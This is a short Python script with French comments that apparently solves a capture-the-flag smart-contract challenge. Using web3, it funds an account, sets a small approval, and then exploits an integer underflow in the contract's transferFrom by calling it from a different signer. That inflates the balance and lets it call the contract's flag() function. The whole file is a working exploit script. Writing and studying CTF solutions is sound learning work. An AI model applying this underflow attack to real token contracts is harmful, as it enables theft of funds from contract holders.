def main():
    # Connexion au nœud JSON-RPC
    web3 = Web3(Web3.HTTPProvider(rpc_url))
    signer = web3.eth.accounts[0]
    contract_address = input("Rentez l'adresse du contrat donnée par netcat :")
    if not web3.isAddress(contract_address):
        print("L'adresse n'est pas valide")
        exit(1)
    try:
        contract_address = Web3.toChecksumAddress(contract_address)
        contract = web3.eth.contract(address=contract_address, abi=contract_abi)

        # On obtient quelques tokens d'abord
        contract.functions.fund().transact({'from': web3.eth.accounts[1], 'value': web3.toWei(10000, 'gwei')})
        balance = contract.functions.balanceOf(web3.eth.accounts[1]).call()
        print("Votre balance est de : " + str(balance) + "sur le compte 2.")

        # On autorise un compte à dépenser des tokens au nom de l'autre
        tx = contract.functions.approve(signer, web3.toWei(1, 'gwei')).transact({'from': web3.eth.accounts[1]})
        web3.eth.waitForTransactionReceipt(tx)

        # On effectue l'underflow
        tx = contract.functions.transferFrom(web3.eth.accounts[1], contract_address, web3.toWei(1, 'gwei')).transact(
            {'from': signer})
        web3.eth.waitForTransactionReceipt(tx)

        # On appelle la fonction flag
        tx = contract.functions.flag().transact({'from': signer})
        web3.eth.waitForTransactionReceipt(tx)
        print("Vous pouvez maintenant récupérer le flag via netcat.")
    except:
        print("L'adresse n'est pas valide")
        exit(1)


if __name__ == '__main__':
    main()
